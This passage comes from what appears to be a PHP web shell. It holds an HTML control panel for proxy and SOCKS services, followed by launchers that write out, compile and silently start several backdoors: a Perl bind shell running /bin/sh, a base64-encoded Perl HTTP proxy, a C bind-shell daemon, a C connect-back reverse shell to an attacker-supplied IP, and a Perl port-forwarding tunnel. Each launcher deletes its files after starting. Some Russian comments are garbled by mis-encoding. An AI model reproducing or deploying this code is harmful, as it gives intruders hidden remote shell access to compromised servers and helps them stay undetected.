&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Web proxy:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5548&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit value='Start' name=perl_proxy style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5554&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 4 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5549&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5555&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 5 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5550&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5556&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;/center&gt;
&lt;br&gt;&lt;Br&gt;
";
}#end of unix


if($_POST['perl_bd']){
$port=$_POST['port'];
$perl_bd_scp = "
use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
open STDIN,\"&lt;&X\";open STDOUT,\"&gt;&X\";open STDERR,\"&gt;&X\";exec(\"/bin/sh -i\");
close X;}}";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl /tmp/nst_perl_bd.pl &");
unlink("/tmp/nst_perl_bd.pl");
}else{
if(is_writable(".")){
mkdir(".nst_bd_tmp");
$fp=fopen(".nst_bd_tmp/nst_perl_bd.pl","w");
fwrite($fp,"$perl_bd_scp");
passthru("nohup perl .nst_bd_tmp/nst_perl_bd.pl &");
unlink(".nst_bd_tmp/nst_perl_bd.pl");
rmdir(".nst_bd_tmp");
}
}
$show_ps="1";
}#end of start perl_bd

if($_POST['perl_proxy']){
$port=$_POST['port'];
$perl_proxy_scp = "IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGluZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl /tmp/nst_perl_proxy.pl $port &");
unlink("/tmp/nst_perl_proxy.pl");
}else{
if(is_writable(".")){
mkdir(".nst_proxy_tmp");
$fp=fopen(".nst_proxy_tmp/nst_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl .nst_proxy_tmp/nst_perl_proxy.pl $port &");
unlink(".nst_proxy_tmp/nst_perl_proxy.pl");
rmdir(".nst_proxy_tmp");
}
}
$show_ps="1";
}#end of start perl_proxy

if($_POST['c_bd']){
$port=$_POST['port'];
$c_bd_scp = "#define PORT $port
#include &lt;stdio.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;

int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr;
struct sockaddr_in client_addr;

int main ()
{
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (soc_des == -1)
        exit(-1);
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0)
        exit(-1);
    if (fork() != 0)
        exit(0);
    setpgrp();
    signal(SIGHUP, SIG_IGN);
    if (fork() != 0)
        exit(0);
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0)
        exit(0);
    while (1) {
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli &lt; 0)
            exit(0);
        cli_pid = getpid();
        server_pid = fork();
        if (server_pid != 0) {
            dup2(soc_cli,0);
            dup2(soc_cli,1);
            dup2(soc_cli,2);
            execl(\"/bin/sh\",\"sh\",(char *)0);
            close(soc_cli);
            exit(0);
        }
    close(soc_cli);
    }
}

";


if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc /tmp/nst_c_bd.c -o /tmp/nst_bd");
passthru("nohup /tmp/nst_bd &");
unlink("/tmp/nst_c_bd.c");
unlink("/tmp/nst_bd");
}else{
if(is_writable(".")){
mkdir(".nst_bd_tmp");
$fp=fopen(".nst_bd_tmp/nst_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc .nst_bd_tmp/nst_c_bd.c -o .nst_bd_tmp/nst_bd");
passthru("nohup .nst_bd_tmp/nst_bd &");
unlink(".nst_bd_tmp/nst_bd");
unlink(".nst_bd_tmp/nst_c_bd.c");
rmdir(".nst_bd_tmp");
}
}
$show_ps="1";
}#end of c bd


if($_POST['bc_c']){ # nc -l -p 4500
$port_c = $_POST['port_c'];
$ip=$_POST['ip'];
$bc_c_scp = "#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;

#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

int fd, sock;
int port = $port_c;
struct sockaddr_in addr;

char mesg[]  = \"::Connect-Back Backdoor:: CMD: \";
char shell[] = \"/bin/sh\";

int main(int argc, char *argv[]) {
        while(argc&lt;2) {
        fprintf(stderr, \" %s &lt;ip&gt; \", argv[0]);
        exit(0); }

addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(argv[1]);
fd = socket(AF_INET, SOCK_STREAM, 0);
connect(fd, (struct sockaddr*)&addr, sizeof(addr));

send(fd, mesg, sizeof(mesg), 0);

dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
execl(shell, \"in.telnetd\", 0);

close(fd);
return 1;
}

";

if(is_writable("/tmp")){
if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc_c.c");}
if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc");}
$fp=fopen("/tmp/nst_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc /tmp/nst_c_bc_c.c -o /tmp/nst_bc_c");
passthru("nohup /tmp/nst_bc_c $ip &");
unlink("/tmp/nst_bc_c");
unlink("/tmp/nst_bc_c.c");
}else{
if(is_writable(".")){
mkdir(".nst_bc_c_tmp");
$fp=fopen(".nst_bc_c_tmp/nst_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc .nst_bc_c_tmp/nst_c_bc_c.c -o .nst_bc_c_tmp/nst_bc_c");
passthru("nohup .nst_bc_c_tmp/nst_bc_c $ip &");
unlink(".nst_bc_c_tmp/nst_bc_c.c");
unlink(".nst_bc_c_tmp/nst_bc_c");
rmdir(".nst_bc_c_tmp");
}
}
$show_ps="1";

}#end of back connect C


if($_POST['datapipe_pl']){
$port_2=$_POST['port_2'];
$port_3=$_POST['port_3'];
$ip=$_POST['ip'];
$datapipe_pl = "
#!/usr/bin/perl
# coded by CuTTer (rus hacker)
use IO::Socket;
use POSIX;

\$localport=$port_2;
\$host=\"$ip\";
\$port=$port_3;

\$daemon=1;

\$DIR = undef;


### Âûâîäèòü ëîã ñîáûòèé (1-äà, 0-íåò)
\$log=0;




\$| = 1;

if (\$daemon){
        print \"3anycKaeM daemon\n\";

        \$pid = fork;
        exit if \$pid;
        die \"Couldn't fork: \$!\" unless defined(\$pid);
        POSIX::setsid() or die \"Can't start a new session: \$!\";
}

%o = ('port' =&gt; \$localport,
          'toport' =&gt; \$port,
          'tohost' =&gt; \$host);

\$ah = IO::Socket::INET-&gt;new(
                         'LocalPort' =&gt; \$localport,
                         'Reuse' =&gt; 1,
                         'Listen' =&gt; 10)
    || die \"Íåëüçÿ îòêðûòü ñîêåò äëÿ ñîåäèíåíèé: \$!\";

print \"Íà÷èíàåì âûïîëíåíèÿ öèêëà.\n\" if \$log;
\$SIG{'CHLD'} = 'IGNORE';
\$num = 0;
while (1) {
        \$ch = \$ah-&gt;accept();
        if (!\$ch) {
                print STDERR \"Ïðåðâàíî âûïîëåíèå accept: \$!\n\";
                next;
        }

        printf(\"Íîâûé êëèåíò: host %s, port %s.\n\",
        \$ch-&gt;peerhost(), \$ch-&gt;peerport()) if \$log;
        ++\$num;
        \$pid = fork();
        if (!defined(\$pid)) {
                print STDERR \"Íåâîçìîæíî âûïîëíèòü fork: \$!\n\";
    } elsif (\$pid == 0) {

### Íîâûé ïðîöåññ
                \$ah-&gt;close();
                Run(\%o, \$ch, \$num);
        } else {
                print \"Parent: Fork ïðîøåë óñïåøíî, çàêðûâàåì ñîêåò.\n\" if \$log;
                \$ch-&gt;close();
        }
}


sub Run {
        my(\$o, \$ch, \$num) = @_;
        my \$th = IO::Socket::INET-&gt;new('PeerAddr' =&gt; \$o-&gt;{'tohost'},
                                                        'PeerPort' =&gt; \$o-&gt;{'toport'});
        print(\"Child: Äåëàåì ðåäèðåêò íà \$o-&gt;{'tohost'}, ïîðò \$o-&gt;{'toport'}.\n\") if \$log;
        if (!\$th) {
                printf STDERR (\"Child: Ïðåðâàí ðåäèðåêò íà %s, ïîðò %s.\n\",
                \$o-&gt;{'tohost'}, \$o-&gt;{'toport'});
                exit 0;
        }

        my \$fh;
        if (\$o-&gt;{'dir'}) {
                \$fh = Symbol::gensym();
                open(\$fh, \"&gt;\$o-&gt;{'dir'}/tunnel\$num.log\")
                or die \"Child: Ïðåðâàíî ñîçäàíèå ëîã ôàéëà \$o-&gt;{'dir'}/tunnel\$num.log: \$!\";
        }

        \$ch-&gt;autoflush();
        \$th-&gt;autoflush();
        while (\$ch || \$th) {
                print \"Child: Âêëþ÷àåì öèêë.\n\" if \$log;
                my \$rin = \"\";
                vec(\$rin, fileno(\$ch), 1) = 1 if \$ch;
                vec(\$rin, fileno(\$th), 1) = 1 if \$th;
                my(\$rout, \$eout);
                select(\$rout = \$rin, undef, \$eout = \$rin, 120);
                if (!\$rout  &&  !\$eout) {
                        print STDERR \"Child: Îøèáêà Timeout.\n\";
                }
                my \$cbuffer = \"\";
                my \$tbuffer = \"\";

                if (\$ch && (vec(\$eout, fileno(\$ch), 1) || vec(\$rout, fileno(\$ch), 1))) {
                        print \"Child: Æäåì äàííûõ îò êëèåíòà.\n\" if \$log;
                        my \$result = sysread(\$ch, \$tbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child: Îøèáêà ïðè ñ÷èòûâàíèè äàííûõ êëèåíòà: \$!\n\";
                                exit 0;
                        }
                        if (\$result == 0) {
                                print \"Child: Êëèåíò îòñîåäèíèëñÿ.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: Äàííûå: \$cbuffer\n\" if \$log;
                }

                if (\$th  &&  (vec(\$eout, fileno(\$th), 1)  || vec(\$rout, fileno(\$th), 1))) {
                        print \"Child: Æäåì äàííûõ.\n\" if \$log;
                        my \$result = sysread(\$th, \$cbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child: Íåâîçìîæíî ñ÷èòàòü äàííûå: \$!\n\";
                                exit 0;
                        }

                        if (\$result == 0) {
                                print \"Child: Ïðîèçîøëî îòñîåäèíåíèå.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: Äàííûå: \$cbuffer\n\" if \$log;
            }

                if (\$fh  &&  \$tbuffer) {
                        (print \$fh \$tbuffer);
                }

                while (my \$len = length(\$tbuffer)) {
                        print \"Child: Îòïðàâëÿåì \$len áàéò.\n\" if \$log;
